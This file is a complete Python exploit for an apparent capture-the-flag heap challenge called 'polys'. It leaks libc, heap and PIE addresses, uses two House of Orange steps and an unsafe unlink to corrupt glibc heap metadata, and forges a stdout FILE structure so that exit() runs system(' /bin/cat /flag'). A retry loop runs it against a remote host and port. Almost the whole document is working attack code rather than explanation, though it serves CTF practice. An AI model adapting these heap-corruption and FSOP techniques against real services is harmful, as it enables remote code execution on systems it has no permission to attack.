#!/usr/bin/env python3
import os
import re
import socket
import struct
import subprocess
import sys
import time

VERSION = 'polys-v4-20260705'

Q = 0x88000001
N = 128

LIBC_LEAK_OFF = 0x204010
STDOUT_OFF = 0x2045C0
WFILE_JUMPS_OFF = 0x202228
SYSTEM_OFF = 0x58750
UNSORTED_OFF = 0x203B20

PIE_FROM_HEAP = 0x6000
PTR_TABLE_OFF = 0x5060
DEG_TABLE_OFF = 0x5454

class Retry(Exception):
    pass

class Tube:
    def __init__(self, host=None, port=None, local=False):
        self.local = local
        self.buf = bytearray()
        self.pending = bytearray()
        self.stage = 'startup'
        self.timeout = float(os.getenv('SOCKET_TIMEOUT', '20'))
        if local:
            wd = os.path.dirname(os.path.abspath(__file__))
            ld = os.path.join(wd, 'ld-linux-x86-64.so.2')
            binary = os.path.join(wd, 'polys')
            self.p = subprocess.Popen(
                [ld, '--library-path', wd, binary],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                bufsize=0,
            )
            self.fd = self.p.stdout.fileno()
        else:
            self.s = socket.create_connection((host, port), timeout=self.timeout)
            self.s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            self.s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            self.s.settimeout(self.timeout)

    def set_stage(self, stage):
        self.stage = stage

    def send(self, data):
        # The binary reads numeric input one byte at a time. Buffering all
        # commands until the next receive avoids thousands of tiny TCP writes.
        self.pending.extend(data)

    def flush(self):
        if not self.pending:
            return
        data = bytes(self.pending)
        self.pending.clear()
        if self.local:
            self.p.stdin.write(data)
            self.p.stdin.flush()
        else:
            self.s.sendall(data)

    def sendline(self, value=b''):
        if isinstance(value, int):
            value = str(value).encode()
        elif isinstance(value, str):
            value = value.encode()
        self.send(value + b'\n')

    def _recv(self, n=4096):
        self.flush()
        if self.local:
            data = os.read(self.fd, n)
        else:
            data = self.s.recv(n)
        if not data:
            raise EOFError(f'connection closed during {self.stage}')
        return data

    def recvuntil(self, marker, timeout=None):
        if timeout is None:
            timeout = self.timeout
        end = time.time() + timeout
        while marker not in self.buf:
            if time.time() > end:
                raise TimeoutError(f'timeout during {self.stage} waiting for {marker!r}')
            self.buf.extend(self._recv())
        pos = self.buf.index(marker) + len(marker)
        out = bytes(self.buf[:pos])
        del self.buf[:pos]
        return out

    def recvline(self, timeout=None):
        return self.recvuntil(b'\n', timeout)

    def recvall(self, timeout=5):
        self.flush()
        out = bytes(self.buf)
        self.buf.clear()
        end = time.time() + timeout
        if self.local:
            import select
            while time.time() < end:
                r, _, _ = select.select([self.fd], [], [], 0.1)
                if not r:
                    if self.p.poll() is not None:
                        break
                    continue
                data = os.read(self.fd, 65536)
                if not data:
                    break
                out += data
        else:
            self.s.settimeout(0.2)
            while time.time() < end:
                try:
                    data = self.s.recv(65536)
                except socket.timeout:
                    continue
                if not data:
                    break
                out += data
        return out

    def close(self):
        try:
            if self.local:
                if self.p.poll() is None:
                    self.p.kill()
            else:
                self.s.close()
        except Exception:
            pass


def ntt(values, inverse=False):
    a = list(values) + [0] * (N - len(values))
    a = a[:N]
    j = 0
    for i in range(1, N):
        bit = N >> 1
        while j & bit:
            j ^= bit
            bit >>= 1
        j ^= bit
        if i < j:
            a[i], a[j] = a[j], a[i]

    length = 2
    while length <= N:
        wlen = pow(3, (Q - 1) // length, Q)
        if inverse:
            wlen = pow(wlen, Q - 2, Q)
        half = length >> 1
        for start in range(0, N, length):
            w = 1
            for k in range(start, start + half):
                u = a[k]
                v = a[k + half] * w % Q
                a[k] = (u + v) % Q
                a[k + half] = (u - v) % Q
                w = w * wlen % Q
        length <<= 1

    if inverse:
        inv_n = pow(N, Q - 2, Q)
        a = [x * inv_n % Q for x in a]
    return a

_MATRIX_CACHE = {}

def invert_matrix(matrix):
    n = len(matrix)
    aug = [row[:] + [1 if i == j else 0 for j in range(n)]
           for i, row in enumerate(matrix)]
    for col in range(n):
        pivot = next((r for r in range(col, n) if aug[r][col]), None)
        if pivot is None:
            raise ValueError('singular interpolation matrix')
        aug[col], aug[pivot] = aug[pivot], aug[col]
        inv = pow(aug[col][col], Q - 2, Q)
        aug[col] = [x * inv % Q for x in aug[col]]
        for r in range(n):
            if r == col or aug[r][col] == 0:
                continue
            f = aug[r][col]
            aug[r] = [(aug[r][c] - f * aug[col][c]) % Q for c in range(2*n)]
    return [row[n:] for row in aug]


def interpolation_inverse(indices):
    key = tuple(indices)
    if key not in _MATRIX_CACHE:
        cols = []
        for c in range(17):
            basis = [0] * N
            basis[c] = 1
            cols.append(ntt(basis))
        matrix = [[cols[c][idx] for c in range(17)] for idx in indices]
        _MATRIX_CACHE[key] = invert_matrix(matrix)
    return _MATRIX_CACHE[key]


def coeffs_for_evals(indices, desired):
    if len(indices) != 17 or len(desired) != 17:
        raise ValueError('need exactly 17 constraints')
    inv = interpolation_inverse(indices)
    return [sum(inv[r][c] * desired[c] for c in range(17)) % Q for r in range(17)]


def split_qword(x):
    return x & 0xffffffff, (x >> 32) & 0xffffffff


def require_field_words(data, label='payload'):
    words = struct.unpack('<128I', data)
    bad = [(i, x) for i, x in enumerate(words) if x >= Q]
    if bad:
        i, x = bad[0]
        raise Retry(f'{label}: dword {i} = {x:#x} is outside field')
    return list(words)


def put_qword(buf, off, value):
    struct.pack_into('<Q', buf, off, value)


def put_dword(buf, off, value):
    struct.pack_into('<I', buf, off, value)


def lift_pointer(lo, hi, known_offset, label):
    lows = [lo]
    if lo + Q <= 0xffffffff:
        lows.append(lo + Q)
    found = []
    for low in lows:
        ptr = (hi << 32) | low
        base = ptr - known_offset
        if base > 0 and base & 0xfff == 0:
            found.append((base, ptr))
    if len(found) != 1:
        raise Retry(f'cannot uniquely lift {label}: lo={lo:#x} hi={hi:#x}')
    return found[0]


class Exploit:
    def __init__(self, io):
        self.io = io

    def read_poly(self, idx, degree, coeffs):
        assert 0 <= idx <= 63 and 0 <= degree <= 16
        assert len(coeffs) == degree + 1
        self.io.sendline(1)
        self.io.sendline(idx)
        self.io.sendline(degree)
        for x in coeffs:
            self.io.sendline(x % Q)

    def mul(self, src, dst):
        self.io.sendline(2)
        self.io.sendline(src)
        self.io.sendline(dst)

    def add(self, a, b, dst):
        self.io.sendline(3)
        self.io.sendline(a)
        self.io.sendline(b)
        self.io.sendline(dst)

    def show(self, idx):
        self.io.sendline(4)
        self.io.sendline(idx)

    def huge_scan(self, stage='huge scanf'):
        self.io.set_stage(stage)
        self.io.sendline(4)
        self.io.send(b'9' * 5000 + b' ')
        self.io.recvuntil(b'Invalid index\n')

    def leak_bases(self):
        # Ten 0x210 chunks. The tenth is the OOB destination adjacent to top.
        old_top = 0x1f8d1
        wanted_top = 0x8d1
        m1 = wanted_top * pow(old_top, Q - 2, Q) % Q

        self.read_poly(2, 15, [m1] + [0] * 15)       # constant multiplier, len 16
        self.read_poly(3, 0, [1])                    # degree byte helper
        for _ in range(17):
            self.mul(2, 3)                           # degree[3] wraps to zero

        self.read_poly(0, 0, [1])                    # leak destination
        self.read_poly(10, 16, [1] + [0] * 16)       # identity, len 17
        for idx in range(11, 16):
            self.read_poly(idx, 0, [1])              # five allocation fillers

        self.mul(2, 128)                             # tenth allocation
        for _ in range(4):
            self.mul(2, 3)                           # ptr128 += 4 * 15 = 0x3c
        self.mul(2, 128)                             # top size 0x1f8d1 -> 0x8d1
        self.huge_scan('first House of Orange')        # first House of Orange

        self.mul(2, 129)                             # consume 0x210 from old top

        # Make degree[0] exactly 128 so show_poly prints the complete inverse NTT.
        for _ in range(7):
            self.mul(10, 0)                          # 1 + 7*16 = 113
        self.mul(129, 0)                             # 113 + 16 - 1 = 128
        self.io.set_stage('initial libc/heap leak')
        self.show(0)
        self.io.recvuntil(b'coefficients (mod 2281701377):\n')
        line = self.io.recvline()
        values = [int(x) for x in line.split()]
        if len(values) != 128:
            raise Retry(f'incomplete leak: got {len(values)} coefficients')

        inv_m1 = pow(m1, Q - 2, Q)
        raw = [x * inv_m1 % Q for x in values]

        libc_base, libc_ptr = lift_pointer(raw[2], raw[3], LIBC_LEAK_OFF, 'libc')
        heap_base, old_victim = lift_pointer(raw[4], raw[5], 0x1730, 'heap')
        pie_base = heap_base - PIE_FROM_HEAP
        if self.io.local:
            # Directly invoking the supplied loader maps the PIE separately from
            # the heap. Remote execution uses the normal kernel ELF path, where
            # the challenge's deterministic PIE/heap delta is 0x6000.
            maps = open(f'/proc/{self.io.p.pid}/maps').read().splitlines()
            pie_base = int(next(
                x for x in maps
                if x.endswith('/polys') and 'r--p 00000000' in x
            ).split('-')[0], 16)

        if old_victim != heap_base + 0x1730:
            raise Retry('heap geometry mismatch')

        return m1, libc_base, heap_base, pie_base

    def exploit(self):
        _, libc, heap, pie = self.leak_bases()
        print(f'[+] libc = {libc:#x}')
        print(f'[+] heap = {heap:#x}')
        print(f'[+] pie  = {pie:#x}')

        table = pie + PTR_TABLE_OFF
        slot3 = table + 3 * 8
        stage1_v = heap + 0x1730

        # First two post-leak mallocs consume the 0x600 old-top remainder.
        fake_u = stage1_v + 0x220

        # Seventeen following source allocations plus one OOB destination come from new top.
        new_top_off = int(os.getenv('NEW_TOP_OFFSET', '0x21000'), 0)
        new_top = heap + new_top_off
        alloc_user = lambda n: new_top + (n - 1) * 0x210 + 0x10

        # Keep the final FSOP objects in chunks allocated before House of
        # Orange. Their positions are anchored to the leaked heap base and do
        # not depend on the exact brk extension used for the second arena.
        payload_ptr = heap + 0x6c0       # original polynomial 0
        zero_ptr = heap + 0xae0          # original polynomial 11
        oob_user = alloc_user(18)
        victim = new_top + 18 * 0x210
        if victim != oob_user + 0x200:
            raise Retry('internal allocation model error')

        distance = victim - fake_u
        if distance <= 0 or distance & 0xf:
            raise Retry('invalid fake chunk distance')

        stdout = libc + STDOUT_OFF
        system = libc + SYSTEM_OFF
        wfile_jumps = libc + WFILE_JUMPS_OFF

        # Check addresses that must appear as uint32 field elements.
        must_encode = {
            'fake fd': slot3 - 0x18,
            'fake bk': slot3 - 0x10,
            'stdout': stdout,
            'payload': payload_ptr,
            'zero': zero_ptr,
            'wide_data': stdout + 0xe0,
            'lock': stdout + 0x1f0,
            'wide_vtable': stdout + 0x170,
            'wfile_jumps': wfile_jumps,
            'system': system,
        }
        for name, addr in must_encode.items():
            lo, hi = split_qword(addr)
            if lo >= Q or hi >= Q:
                raise Retry(f'{name} cannot be represented: {addr:#x}')
        print('[+] address set is encodable; launching heap chain')

        # Fake large chunk at polynomial 3. Unlink writes polys[3] = pointer-table base.
        fake = bytearray(68)
        put_qword(fake, 0x00, 0)
        put_qword(fake, 0x08, distance | 1)
        put_qword(fake, 0x10, slot3 - 0x18)
        put_qword(fake, 0x18, slot3 - 0x10)
        put_qword(fake, 0x20, 0)
        put_qword(fake, 0x28, 0)
        fake_words = list(struct.unpack('<17I', fake))
        if any(x >= Q for x in fake_words):
            raise Retry('fake chunk contains non-field dword')
        self.read_poly(3, 16, coeffs_for_evals(list(range(17)), fake_words))

        # ptr130 overlaps degree[7:9]. Wrap degree[7] back to a zero qword first.
        self.read_poly(7, 0, [1])
        for _ in range(17):
            self.mul(2, 7)

        # Stage-two free chunk will have size 0xae0 after scanf releases its buffer.
        n_new = 18
        old_top_field = 0x21001 - n_new * 0x210
        wanted_chunk = (-n_new * 0x210) & 0xfff
        if wanted_chunk < 0x830:
            wanted_chunk += 0x1000
        if wanted_chunk != 0xae0:
            raise Retry(f'unexpected second top size {wanted_chunk:#x}')
        wanted_field = wanted_chunk | 1
        m2 = wanted_field * pow(old_top_field, Q - 2, Q) % Q

        # scanf allocates and then frees an exact 0x810 chunk. Its header is
        # therefore 0x811, regardless of the larger page-aligned top chunk.
        # The unaligned write at victim+5 changes 0x11000000 -> 0x10000001:
        # it clears PREV_INUSE and seeds one non-zero byte in prev_size.
        pass1_vals = [1] * 17
        pass1_vals[121 - 111] = 0x10000001 * pow(0x11000000, Q - 2, Q) % Q
        pass1_vals[122 - 111] = 1

        pass2_vals = [1] * 17
        pass2_vals[116 - 111] = pow(0x01000000, Q - 2, Q)

        # The chunk is currently linked in the unsorted bin. Unaligned field
        # operations reduce every touched uint32 modulo Q, so factors of one
        # would still corrupt fd/bk whenever a crossing word is >= Q. Simulate
        # the first two passes byte-for-byte, then make the aligned third pass
        # restore a fully valid chunk header and its unsorted-bin links.
        unsorted = libc + UNSORTED_OFF
        ulo, uhi = split_qword(unsorted)
        if ulo >= Q or uhi >= Q:
            raise Retry(f'unsorted link cannot be represented: {unsorted:#x}')

        region = bytearray(0x80)
        put_qword(region, 0x00, 0)
        put_qword(region, 0x08, 0x811)
        put_qword(region, 0x10, unsorted)
        put_qword(region, 0x18, unsorted)
        region[0x30:0x80] = b'9' * (0x80 - 0x30)

        def apply_pass(buf, base_off, factors):
            for j, factor in zip(range(111, 128), factors):
                off = base_off + 4 * j
                cur = struct.unpack_from('<I', buf, off)[0]
                struct.pack_into('<I', buf, off, (cur * factor) % Q)

        # Add a prefix so negative offsets from the first two unaligned passes
        # are represented without special cases.
        sim = bytearray(0x80 + 0x80)
        origin = 0x40
        sim[origin:origin + len(region)] = region
        apply_pass(sim, origin - 479, pass1_vals)  # oob+0x21 relative to victim
        apply_pass(sim, origin - 462, pass2_vals)  # oob+0x32 relative to victim

        desired = [0] * 17
        desired[0] = distance & 0xffffffff
        desired[1] = (distance >> 32) & 0xffffffff
        desired[2] = 0x810
        desired[3] = 0
        desired[4], desired[5] = ulo, uhi
        desired[6], desired[7] = ulo, uhi

        pass3_vals = []
        for i, want in enumerate(desired):
            cur = struct.unpack_from('<I', sim, origin + 4 * i)[0] % Q
            if cur == 0:
                if want != 0:
                    raise Retry(f'cannot seed final victim dword {i}')
                pass3_vals.append(0)
            else:
                pass3_vals.append(want * pow(cur, Q - 2, Q) % Q)

        # Allocation order 1..7 from the new top.
        self.read_poly(20, 1, [1, 0])
        self.read_poly(21, 2, [1, 0, 0])
        self.read_poly(22, 0, [m2])
        self.read_poly(23, 16, coeffs_for_evals(list(range(111, 128)), pass1_vals))
        self.read_poly(24, 16, coeffs_for_evals(list(range(111, 128)), pass2_vals))
        self.read_poly(25, 16, coeffs_for_evals(list(range(111, 128)), pass3_vals))
        self.read_poly(26, 16, [0] * 16 + [1])       # x^16

        # Build a complete fake stdout object as one polynomial.
        fs = bytearray(0x200)
        fs[:16] = b' /bin/cat /flag\x00'
        put_qword(fs, 0x20, 0)                       # _IO_write_base
        put_qword(fs, 0x28, 1)                       # _IO_write_ptr
        put_qword(fs, 0x68, 0)                       # _chain
        put_qword(fs, 0x88, stdout + 0x1f0)          # _lock
        put_qword(fs, 0xa0, stdout + 0xe0)           # _wide_data
        put_dword(fs, 0xc0, 0)                       # _mode
        put_qword(fs, 0xd8, wfile_jumps)             # legitimate vtable
        put_qword(fs, 0xe0 + 0x18, 0)            # wide write base
        put_qword(fs, 0xe0 + 0x20, 1)            # wide write ptr
        put_qword(fs, 0xe0 + 0x30, 0)            # wide buffer base
        put_qword(fs, 0xe0 + 0xe0, stdout + 0x170)   # fake wide vtable
        put_qword(fs, 0x170 + 0x68, system)
        payload_raw = require_field_words(bytes(fs), 'fake stdout')
        full_coeffs = ntt(payload_raw, inverse=True)

        # Allocation order 8..15: eight shifted coefficient blocks.
        for j in range(8):
            idx = 27 + j
            block = full_coeffs[16*j:16*(j+1)]
            self.read_poly(idx, 15, block)
            for _ in range(j):
                self.mul(26, idx)

        # Allocation 16: writer for polys[0..]. Allocation 17: zero source.
        table_words = [0] * 17
        for qidx, addr in enumerate((stdout, payload_ptr, zero_ptr)):
            lo, hi = split_qword(addr)
            table_words[2*qidx] = lo
            table_words[2*qidx + 1] = hi
        self.read_poly(35, 16, coeffs_for_evals(list(range(17)), table_words))
        self.read_poly(36, 0, [0])

        # Assemble the complete fake FILE in the old polynomial-0 chunk and
        # turn old polynomial 11 into a stable all-zero copy source.
        self.add(36, 36, 0)
        for idx in range(27, 35):
            self.add(0, idx, 0)
        self.mul(36, 11)

        # Allocation 18: OOB polynomial adjacent to current top.
        self.mul(2, 130)

        # ptr130 = oob_user + 0x20, then corrupt top size to page-aligned 0xae1.
        self.mul(10, 7)
        self.mul(10, 7)
        self.mul(22, 130)
        self.huge_scan('second House of Orange')

        # Forge victim.prev_size=distance and victim.size=0x810 with PREV_INUSE clear.
        self.mul(20, 7)       # +1  -> oob+0x21
        self.mul(23, 130)
        self.mul(10, 7)       # +16 -> oob+0x31
        self.mul(20, 7)       # +1  -> oob+0x32
        self.mul(24, 130)
        self.mul(10, 7)       # +16 -> oob+0x42
        self.mul(21, 7)       # +2  -> oob+0x44
        self.mul(25, 130)
        self.io.set_stage('victim header verification')
        self.io.sendline(9)
        self.io.recvuntil(b'Invalid choice\n')

        # Exact 0x810 scanf allocation frees with P=0 and triggers unsafe unlink(fake_u).
        self.huge_scan('unsafe unlink trigger')

        # polys[3] now points to the pointer table itself.
        self.add(35, 11, 3)
        # polys[0]=stdout, polys[1]=fake FILE payload, polys[2]=zero.
        self.add(1, 2, 0)

        # exit() flushes the forged stdout and calls system("cat /flag").
        self.io.set_stage('final FSOP flush')
        self.io.sendline(5)
        output = self.io.recvall(timeout=float(os.getenv('FINAL_TIMEOUT', '10')))
        return output


def run_once(host=None, port=None, local=False):
    io = Tube(host, port, local=local)
    try:
        return Exploit(io).exploit()
    finally:
        io.close()


def main():
    local = len(sys.argv) == 2 and sys.argv[1] == '--local'
    if not local and len(sys.argv) != 3:
        print(f'usage: {sys.argv[0]} HOST PORT | --local')
        raise SystemExit(1)
    host = None if local else sys.argv[1]
    port = None if local else int(sys.argv[2])

    max_attempts = int(os.getenv('MAX_ATTEMPTS', '2048'))
    retry_delay = float(os.getenv('RETRY_DELAY', '0.50'))
    print(f'[*] {VERSION} | file={os.path.abspath(__file__)}')
    print(f'[*] max_attempts={max_attempts} socket_timeout={os.getenv("SOCKET_TIMEOUT", "20")} final_timeout={os.getenv("FINAL_TIMEOUT", "10")}')
    for attempt in range(1, max_attempts + 1):
        print(f'[*] attempt {attempt}')
        try:
            out = run_once(host, port, local)
            text = out.decode(errors='replace')
            if text:
                print(text, end='' if text.endswith('\n') else '\n')
            match = re.search(r'[A-Za-z0-9_]+\{[^\n}]+\}', text)
            if match:
                print(f'<FLAG>{match.group(0)}</FLAG>')
                return
            raise Retry('flag not found in final output')
        except (Retry, EOFError, TimeoutError, OSError, BrokenPipeError) as exc:
            print(f'[-] retry: {exc}')
            # Avoid hammering fork-per-connection infrastructure. Timeouts get
            # a longer cooldown because they often indicate a saturated proxy.
            delay = max(1.0, retry_delay) if isinstance(exc, TimeoutError) else retry_delay
            if delay > 0:
                time.sleep(delay)
            continue
    raise SystemExit(f'exploit did not succeed after {max_attempts} attempts')

if __name__ == '__main__':
    main()

